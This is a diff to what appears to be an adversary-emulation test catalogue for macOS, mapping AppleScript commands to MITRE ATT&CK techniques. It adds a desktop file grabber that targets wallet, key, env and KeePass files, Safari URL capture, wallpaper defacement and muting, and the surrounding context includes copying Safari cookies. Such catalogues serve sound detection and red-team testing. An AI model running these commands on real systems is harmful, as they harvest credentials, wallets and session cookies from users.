@@ -99,6 +99,17 @@
     "test_number": 1
   },
   {
+    "name": "Copy files from desktop",
+    "command": "set fileGrabberFolderPath to \"#{destinationPath}\"\nset extensionsList to {\"txt\", \"docx\", \"rtf\", \"doc\", \"wallet\", \"keys\", \"key\", \"env\", \"md\", \"kdbx\"}\n\ntry\n \tset desktopFiles to every file of desktop\n \trepeat with aFile in desktopFiles\n  \t\ttry\n \t\t\t  set fileExtension to name extension of aFile\n   \t\t\tif fileExtension is in extensionsList then\n  \t\t\t\tset fileSize to size of aFile\n  \t\t\t\tif fileSize < 51200 then\n   \t\t\t\t\tset destinationFolder to (POSIX file fileGrabberFolderPath) as alias\n   \t\t\t\t\tduplicate aFile to destinationFolder with replacing\n  \t\t\t\tend if\n   \t\t\tend if\n  \t\tend try\n \tend repeat\nend try\n",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": false,
+    "description": "FileGrabber grabs files from desktop and copies them to a temporary folder",
+    "technique_id": "T1083",
+    "technique_name": "File and Directory Discovery",
+    "test_number": 1
+  },
+  {
     "name": "List files and directories in Macintosh HD",
     "command": "tell application \"Finder\" to get name of every item of folder POSIX file \"#{folderName}\"\n",
     "language": "AppleScript",
@@ -107,7 +118,7 @@
     "description": "Enumerate files and directories in the root filesystem using Finder application via AppleScript",
     "technique_id": "T1083",
     "technique_name": "File and Directory Discovery",
-    "test_number": 1
+    "test_number": 2
   },
   {
     "name": "List files and directories in root directory",
@@ -118,7 +129,7 @@
     "description": "Perform directory listing of root filesystem using AppleScript list folder command",
     "technique_id": "T1083",
     "technique_name": "File and Directory Discovery",
-    "test_number": 2
+    "test_number": 3
   },
   {
     "name": "Get system information",
@@ -151,6 +162,17 @@
     "description": "This test searches for passwords in the bash history file.",
     "technique_id": "T1552.003",
     "technique_name": "Unsecured Credentials: Bash History",
+    "test_number": 1
+  },
+  {
+    "name": "Capture currently opened Safari URL",
+    "command": "tell application \"safari\"\n  set curURL to URL in front document\n  return curURL\nend tell",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": false,
+    "description": "Adversaries use osascript to gather information about the victim's browsing habits and preferences.",
+    "technique_id": "T1217",
+    "technique_name": "Browser Information Discovery",
     "test_number": 1
   },
   {
@@ -396,6 +418,17 @@
     "test_number": 1
   },
   {
+    "name": "Change Wallpaper",
+    "command": "tell application \"System Events\" to tell every desktop to set picture to \"#{filePath}\"\n",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": false,
+    "description": "Adveraries use osascript to change the device wallpaper.",
+    "technique_id": "T1491.001",
+    "technique_name": "Defacement: Internal Defacement",
+    "test_number": 1
+  },
+  {
     "name": "Copy Safari BinaryCookies",
     "command": "tell application \"Finder\"\n  set destinationFolderPath to POSIX file \"#{destination_path}\"\n  set safariFolder to ((path to library folder from user domain as text) & \"Containers:com.apple.Safari:Data:Library:Cookies:\")\n  duplicate file \"Cookies.binarycookies\" of folder safariFolder to folder destinationFolderPath with replacing\nend tell\n",
     "language": "AppleScript",
@@ -438,6 +471,17 @@
     "technique_id": "T1059.002",
     "technique_name": "Command and Scripting Interpreter: AppleScript",
     "test_number": 3
+  },
+  {
+    "name": "Mute Volume",
+    "command": "set volume with output muted",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": false,
+    "description": "Mutes the volume on the system.",
+    "technique_id": "T1059.002",
+    "technique_name": "Command and Scripting Interpreter: AppleScript",
+    "test_number": 4
   },
   {
     "name": "Delete system log files",
